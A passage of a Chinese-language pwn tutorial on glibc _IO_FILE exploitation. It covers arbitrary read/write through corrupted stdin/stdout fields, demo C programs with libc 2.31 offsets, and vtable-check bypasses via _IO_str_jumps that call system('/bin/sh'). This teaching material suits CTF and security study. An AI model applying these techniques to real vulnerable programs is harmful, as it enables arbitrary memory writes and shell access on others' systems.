<h2 id="fileno-相关利用"><a href="#fileno-相关利用" class="headerlink" title="_fileno 相关利用"></a>_fileno 相关利用</h2><p><code>_IO_FILE</code> 在使用标准 <code>IO</code> 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用 <code>fwrite</code>、<code>fread</code> 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。进程中包含了系统默认的三个文件流 <code>stdin,stdout,stderr</code>，因此这种方式可以不需要进程中存在文件操作，通过 <code>scanf,printf </code>一样可以进行利用。</p>
<ul>
<li><code>fp-&gt;_fileno</code> 的值就是文件描述符，<code>stderr</code> 值为 <code>2</code>，<code>stdout</code> 值为 <code>1</code>，<code>stdin</code> 值为 <code>0</code>。</li>
<li><code>fp-&gt;_IO_buf_base</code> 表示操作的起始地址</li>
<li><code>fp-&gt;_IO_buf_end</code> 表示结束地址</li>
</ul>
<p><strong>stdin 任意写</strong></p>
<p>大致了解 <code>fread</code> 的执行流程后，还需要绕过以下检查:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/* fp-&gt;_IO_buf_base == NULL 会调用 _IO_doallocbuf (fp) 初始化缓冲区 */</span></span><br><span class="line">  	<span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	    	<span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	   		fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	    &#125;</span><br><span class="line">        _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 如果 fp-&gt;_IO_read_end &gt; fp-&gt;_IO_read_ptr 则会将缓冲区内容复制到目标地址 */</span></span><br><span class="line">	...</span><br><span class="line">    have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">	    want -= have;</span><br><span class="line">	    fp-&gt;_IO_read_ptr += have;</span><br><span class="line">	 &#125;</span><br><span class="line">     ...</span><br><span class="line">     <span class="comment">/* 如果输入长度大于缓冲区大小则会直接读入 */</span></span><br><span class="line">	 <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">	 &#123;</span><br><span class="line">	 	<span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	 &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>即:</p>
<ul>
<li>设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>。</li>
<li>设置 <code>_flag &amp;~ _IO_NO_READS</code> 即<code> _flag &amp;~ 0x4</code>。</li>
<li>设置 <code>_fileno</code> 为 <code>0</code> ，表示读入数据的来源是 <code>stdin</code> 。</li>
<li>设置<code> _IO_buf_base</code> 为 <code>write_start</code> ，<code>_IO_buf_end</code> 为 <code>write_end</code> ；</li>
<li>使得 <code>_IO_buf_end - _IO_buf_base</code> 大于 <code>fread</code> 要读的数据。</li>
</ul>
<p><strong>示例</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[<span class="number">100</span>];</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="comment">// 0x1ec980 为 _IO_2_1_stdin_ 偏移</span></span><br><span class="line">    FILE *fp = libc_base + <span class="number">0x1ec980</span>;</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr = <span class="number">0x0</span>;</span><br><span class="line">    fp-&gt;_flags &amp;= ~<span class="number">0x4</span>;</span><br><span class="line">    fp-&gt;_fileno = <span class="number">0x0</span>;</span><br><span class="line">    fp-&gt;_IO_buf_base = (<span class="type">char</span> *) buf;</span><br><span class="line">    fp-&gt;_IO_buf_end = (<span class="type">char</span> *) &amp;buf[<span class="number">99</span>];</span><br><span class="line">    <span class="built_in">fread</span>(stack_buf, <span class="number">1</span>, <span class="number">3</span>, fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buf: %s&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_buf: %s\n&quot;</span>, stack_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用 <code>libc6_2.31-0ubuntu9.9_amd64</code> 版本编译运行结果如下:</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231020153758598.png"
                      alt="image-20231020153758598"
                ></p>
<p><strong>stdout 任意写</strong></p>
<p>有如下源码:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">        count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">			count = to_do;</span><br><span class="line">        </span><br><span class="line">        f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">        s += count;</span><br><span class="line">        to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>将<code>_IO_write_ptr</code> 指向 <code>write_start</code> ，<code>_IO_write_end</code> 指向 <code>write_end</code> 即可实现在目标地址写入数据。</p>
<p><strong>示例</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> *stack_buf = <span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    FILE *fp = (FILE *) (libc_base + <span class="number">0x1ed6a0</span>);</span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) &amp;buf[<span class="number">0</span>];</span><br><span class="line">    fp-&gt;_IO_write_end = (<span class="type">char</span> *) &amp;buf[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">fwrite</span>(stack_buf, <span class="number">1</span>, <span class="number">8</span>, fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nbuf: %s\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用 <code>libc6_2.31-0ubuntu9.9_amd64</code> 版本编译运行结果如下:</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231020182423234.png"
                      alt="image-20231020182423234"
                ></p>
<p><strong>stdout 任意读</strong></p>
<p>程序正确执行到 <code>_IO_overflow</code> 时，有如下源码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr 就会将待输出的数据写入缓冲区，_IO_overflow 只有在输出缓冲区写满的时候才将其	   *  输出。因此为了不造成不必要的麻烦，直接令 f-&gt;_IO_write_end = f-&gt;_IO_write_ptr 。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    	count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  	<span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  	<span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      	<span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">			count = to_do;</span><br><span class="line">        </span><br><span class="line">      	f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      	s += count;</span><br><span class="line">      	to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// _flags 不能包含 _IO_NO_WRITES，其值为 0x8 。</span></span><br><span class="line">  	<span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">     	 f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      	__set_errno (EBADF);</span><br><span class="line">      	<span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//为了进入如下分枝进造成不必要的麻烦， _flags 应包含 _IO_CURRENTLY_PUTTING，其值为 0x0800</span></span><br><span class="line"> 	<span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">		...</span><br><span class="line">        <span class="comment">// _IO_write_base = read_start，_IO_write_ptr = read_end </span></span><br><span class="line">  		<span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    		<span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">    	...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) <span class="built_in">new_do_write</span> (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_ver</span> (_IO_new_do_write, _IO_do_write)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span></span></span><br><span class="line"><span class="function">_IO_size_t</span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">// 构造 _flags 包含 _IO_IS_APPENDING，其值为 0x1000 </span></span><br><span class="line">    <span class="comment">// 或者 _IO_read_end 等于 _IO_write_base 就可以直接执行到 _IO_SYSWRITE</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    	fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  	<span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      	_IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      	<span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     	fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  	count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>即</p>
<ul>
<li>设置 <code>_flag &amp;~ _IO_NO_WRITES</code> 即<code> _flag &amp;~ 0x8</code>。</li>
<li>设置<code> _flag &amp; _IO_CURRENTLY_PUTTING</code> 即 <code>_flag | 0x800</code></li>
<li>设置 <code>_IO_write_base</code> 指向想要泄露的地方；<code>_IO_write_ptr</code> 指向泄露结束的地址。</li>
<li>设置 <code>_IO_read_end</code> 等于<code> _IO_write_base</code> 或设置 <code>_flag &amp; _IO_IS_APPENDING</code> 即 <code>_flag | 0x1000</code>。</li>
<li>设置 <code>_IO_write_end</code> 等于 <code>_IO_write_ptr</code>（非必须）。</li>
</ul>
<p><strong>示例</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[] = <span class="string">&quot;abcdef&quot;</span>;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="comment">// _IO_2_1_stdout</span></span><br><span class="line">    FILE *fp = (FILE *) (libc_base + <span class="number">0x1ed6a0</span>);</span><br><span class="line">    fp-&gt;_flags &amp;= ~<span class="number">0x8</span>;</span><br><span class="line">    fp-&gt;_flags |= <span class="number">0x800</span>;</span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) buf;</span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) &amp;buf[<span class="number">6</span>];</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_base;</span><br><span class="line">    <span class="built_in">puts</span>(stack_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022105118674.png"
                      alt="image-20231022105118674"
                ></p>
<h2 id="IO-str-jumps-与-IO-wstr-jumps"><a href="#IO-str-jumps-与-IO-wstr-jumps" class="headerlink" title="_IO_str_jumps 与 _IO_wstr_jumps"></a>_IO_str_jumps 与 _IO_wstr_jumps</h2><p><code>__start___libc_IO_vtables</code>指向第一个 <code>vtable</code> 地址<code>_IO_helper_jumps</code>，而<code>__stop___libc_IO_vtables</code>指向最后一个vtable<code>_IO_str_chk_jumps</code>结束的地址。想将 <code>vtable</code> 覆盖成外部地址且仍然通过检查，可以有两种方式：</p>
<ol>
<li>使得 <code>flag == &amp;_IO_vtable_check</code></li>
<li>使 <code>_dl_open_hook!= NULL</code></li>
<li>寻找其他位于<code>__start___libc_IO_vtables</code> 和 <code>__stop___libc_IO_vtables</code> 之间的 <code>vtable</code></li>
</ol>
<p>第一种方式不可控，因为 <code>flag</code> 的获取和比对是类似 <code>canary</code> 的方式，其对应的汇编代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;_IO_vtable_check+7&gt;     mov    rax, qword ptr [rip + 0x32bb2a] &lt;0x7fefcac69458&gt;</span><br><span class="line">&lt;_IO_vtable_check+14&gt;    ror    rax, 0x11</span><br><span class="line">&lt;_IO_vtable_check+18&gt;    xor    rax, qword ptr fs:[0x30]</span><br><span class="line">&lt;_IO_vtable_check+27&gt;    cmp    rax, rdi</span><br></pre></td></tr></table></figure></div>

<p>第二种方式，理论上可行，但是如果我们可以找到存在往<code>_dl_open_hook</code>中写值的方法，完全利用该方法来进行更为简单的利用。</p>
<p>第三种方式， <code>_IO_str_jumps</code> 与 <code>__IO_wstr_jumps</code> 这两个 <code>vtable</code> 就位于 <code>__stop___libc_IO_vtables</code> 和 <code>__start___libc_IO_vtables</code> 之间，所以我们是可以利用他们来通过 <code>IO_validate_vtable</code> 的检测的，只需要将 <code>*vtable</code> 填成 <code>_IO_str_jumps</code> 或 <code>_IO_wstr_jumps</code> 地址即可。<code>_IO_wstr_jumps</code>与<code>_IO_str_jumps</code>功能基本一致，只是<code>_IO_wstr_jumps</code>是处理 <code>wchar</code>的，利用方式主要有针对 <code>_IO_str_jumps</code> 中的 <code>_IO_str_finsh</code> 函数和 <code>_IO_str_overflow</code> 两种。</p>
<p><strong>一些下面用到的结构体定义</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> _f;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *vtable;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_strfile_</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_streambuf</span> _sbf;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_str_fields</span> _s;</span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure></div>

<h3 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> _IO_str_jumps libio_vtable =</span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(finish, _IO_str_finish),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(overflow, _IO_str_overflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(underflow, _IO_str_underflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(uflow, _IO_default_uflow),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsputn, _IO_default_xsputn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekoff, _IO_str_seekoff),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seekpos, _IO_default_seekpos),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(setbuf, _IO_default_setbuf),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(sync, _IO_default_sync),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(doallocate, _IO_default_doallocate),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(read, _IO_default_read),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(write, _IO_default_write),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(seek, _IO_default_seek),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(close, _IO_default_close),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(stat, _IO_default_stat),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  <span class="built_in">JUMP_INIT</span>(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>_IO_str_jumps</code> 符号在 <code>strip</code> 后会丢失，定位其地址方法如下：</p>
<ul>
<li><code>_IO_str_jumps</code>是 <code>vtable</code> 中的倒数第二个表，可以通过 <code>vtable</code> 的最后地址减去<code>0x168</code>。</li>
<li><code>IDA</code> 寻找<code>_IO_file_jumps</code> 在后面找到<code>_IO_str_****</code>的函数表即可。</li>
</ul>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231022121407625.png"
                      alt="image-20231022121407625"
                ></p>
<p><strong>_IO_str_finish</strong></p>
<p>下面是 <code>_IO_str_finish</code> 函数：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* glibc &lt; 2.28 的实现 */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它使用了 <code>_IO_FILE</code> 结构体中的值当作函数地址来直接调用，如果修改 <code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code> 为 <code>system</code> 地址，然后修改 <code>fp-&gt;_IO_buf_base</code> 为 <code>/bin/sh\x00</code> 字符串地址，然后触发程序执行 <code>_IO_str_finish</code> 函数就可以得到 <code>shell</code> 。</p>
<blockquote>
<ul>
<li>首先需要绕过之前的 <code>_IO_flush_all_lokcp</code>函数中的输出缓冲区的检查 <code>_mode&lt;=0</code> 以及<code>_IO_write_ptr&gt;_IO_write_base</code> 进入到 <code>_IO_OVERFLOW</code> 中。</li>
<li>将 <code>vtable</code> 的地址覆盖成 <code>_IO_str_jumps-0x8</code> 的地址，这样原来 <code>_IO_OVERFLOW</code> 就变成 <code>_IO_str_finish</code>。</li>
<li><code>fp-&gt;_IO_buf_base = &quot;/bin/sh\x00&quot;</code> 作为函数第一个参数。</li>
<li><code>fp-&gt;_flags</code>要不包含<code>_IO_USER_BUF</code>，它被定义为 <code>1</code> ，即 <code>fp-&gt;_flags</code>最低位为 <code>0</code>。</li>
<li><code>fp-&gt;_s._free_buffer(fp+0xe8)</code>改为<code>system</code>或<code>one gadget</code>的地址。</li>
</ul>
</blockquote>
<p><strong>_IO_str_overflow</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)</span></span><br><span class="line">  	pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  	<span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// not allowed 绕过 _IO_USER_BUF(0x01)</span></span><br><span class="line">      	<span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF)</span><br><span class="line">			<span class="keyword">return</span> EOF;</span><br><span class="line">      	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">	  		<span class="type">char</span> *new_buf;</span><br><span class="line">	  		<span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">            <span class="comment">// fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base，这里让 _IO_buf_base = 0;</span></span><br><span class="line">	  		<span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">            <span class="comment">// fp-&gt;_IO_buf_end = (bin_sh_addr - 100) / 2</span></span><br><span class="line">	  		_IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  		<span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    		<span class="keyword">return</span> EOF;</span><br><span class="line">            <span class="comment">// 函数指针调用 fp+0xe8 = system_addr</span></span><br><span class="line">	  		new_buf= (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line">			...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>即绕过条件为 </p>
<blockquote>
<ul>
<li>首先需要绕过之前的 <code>_IO_flush_all_lokcp</code>函数中的输出缓冲区的检查 <code>_mode&lt;=0</code> 以及<code>_IO_write_ptr&gt;_IO_write_base</code> 进入到 <code>_IO_OVERFLOW</code> 中。</li>
<li><code>_IO_buf_base = 0</code>，<code>_IO_buf_end = (bin_sh_addr - 100) / 2</code></li>
<li><code>fp-&gt;_flags</code>要不包含<code>_IO_USER_BUF</code>，它被定义为 <code>1</code> ，即 <code>fp-&gt;_flags</code>最低位为 <code>0</code>。</li>
<li><code>_IO_write_ptr = ((bin_sh_addr - 100) / 2) +1</code> 且<code>_IO_write_base = 0x0</code></li>
<li><code>fp-&gt;_s._allocate_buffer(fp+0xe0)</code> 改为 <code>system</code> 或 <code>one_gadget</code> 地址。</li>
</ul>
</blockquote>
<p>直接将 <code>vtable-&gt;fake_IO_str_jumps_vtable</code> 即可，因为 <code>_IO_str_overflow</code> 也在 <code>0x18</code> 的位置。</p>
